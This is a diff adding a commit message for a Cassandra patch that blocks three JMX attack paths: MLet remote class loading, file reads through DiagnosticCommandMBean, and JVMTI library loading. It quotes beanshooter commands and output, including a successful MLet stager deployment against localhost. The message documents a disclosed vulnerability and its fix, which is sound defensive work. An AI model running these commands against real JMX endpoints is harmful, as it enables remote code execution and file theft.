@@ -1,0 +1,83 @@
+Harden JMX by resolving beanshooter issues
+Fix JMX security vulnerabilities
+As reported by Murray McAllister, there are multiple JMX vulnerabilities
+in the default Cassandra configuration on 3.0, 3.11, 4.0 and trunk,
+across Java 8 and Java 11. These are limited to authenticated JMX users
+only.
+Vulnerabilities:
+1. (Java 8 and 11) Remote Java Library loading and execution via MLet
+2. (Java 11 only) Remote Java file reads via DiagnosticCommandMBean's
+   compilerDirectivesAdd implementation leaking arbitrary file contents
+3. (Java 11 only) Remote .so library loading via JVMTI
+qtc-de/beanshooter is a JMX enumeration tool that uses these mechanisms
+and others:
+https://github.com/qtc-de/beanshooter/blob/2ec4f7a4b44a29f52315973fe944eb34bc772063/beanshooter/src/de/qtc/beanshooter/mbean/diagnostic/Dispatcher.java#L48
+Remote file reads via compilerDirectiveAdd does not appear to be
+reproducible on Java 8 (cassandra-
+{3.0,3.11}
+, Java 1.8.0_345-b01 from
+Adoptium / Temurin). Using qtc-de/beanshooter and cassandra-3.0
+(a78db628):
+
+
+$ java -jar target/beanshooter-3.0.0-jar-with-dependencies.jar diagnostic read --verbose 127.0.0.1 7199 /tmp/hello
+[-] A method with signature compilerDirectivesAdd([Ljava.lang.String;) does not exist on the endpoint.
+[-] If you invoked a deployed MBean, make sure that the correct version was deployed.
+[-] Cannot continue from here.
+
+
+Java 8 also appears to not be vulnerable to remote library loading:
+
+
+$ java -jar target/beanshooter-3.0.0-jar-with-dependencies.jar diagnostic load --verbose 127.0.0.1 7199 /tmp/hello
+[-] A method with signature jvmtiAgentLoad([Ljava.lang.String;) does not exist on the endpoint.
+[-] If you invoked a deployed MBean, make sure that the correct version was deployed.
+[-] Cannot continue from here.
+
+
+But Java 8 does appear to be vulnerable to MLet:
+
+
+$ java -jar target/beanshooter-3.0.0-jar-with-dependencies.jar tonka deploy --stager-url http://localhost:8000 127.0.0.1 7199
+[+] Starting MBean deployment.
+[+]
+[+]     Deplyoing MBean: TonkaBean
+[+]
+[+]             MBean class is not known by the server.
+[+]             Starting MBean deployment.
+[+]
+[+]                     Deplyoing MBean: MLet
+[+]                     MBean with object name DefaultDomain:type=MLet was successfully deployed.
+[+]
+[+]             Loading MBean from http://localhost:8000
+[+]
+[+]                     Creating HTTP server on: localhost:8000
+[+]                     Creating MLetHandler for endpoint: /
+[+]                     Creating JarHandler for endpoint: /fb0f34fe7c4f456bb44c07d9650dbf1e
+[+]                     Starting HTTP server.
+[+]
+[+]                     Incoming request from: localhost
+[+]                     Requested resource: /
+[+]                     Sending mlet:
+[+]
+[+]                             Class:     de.qtc.beanshooter.tonkabean.TonkaBean
+[+]                             Archive:   fb0f34fe7c4f456bb44c07d9650dbf1e
+[+]                             Object:    MLetTonkaBean:name=TonkaBean,id=1
+[+]                             Codebase:  http://localhost:8000
+[+]
+[+]                     Incoming request from: localhost
+[+]                     Requested resource: /fb0f34fe7c4f456bb44c07d9650dbf1e
+[+]                     Sending jar file with md5sum: 39d35ebd20aee73fbb83928584a530d7
+[+]
+[+]     MBean with object name MLetTonkaBean:name=TonkaBean,id=1 was successfully deployed.
+
+
+Java 11 appears to be vulnerable to all three vulnerabilities, using JDK
+Adoptium / Temurin 11.0.16.1+1 and cassandra-4.0 (5beab63b).
+This patch fixes the above issues by introducing a new system property:
+`cassandra.jmx.security.profile`, which can be set to "restrictive"
+(default) or "lax". The restrictive profile blocks the mechanisms for
+all three vulnerabilities, by introducing a JMX
+MBeanServerAccessController. Users can use the lax profile if they
+require these mechanisms, or use their own authorization proxy by
+specifying `cassandra.jmx.authorizer`.
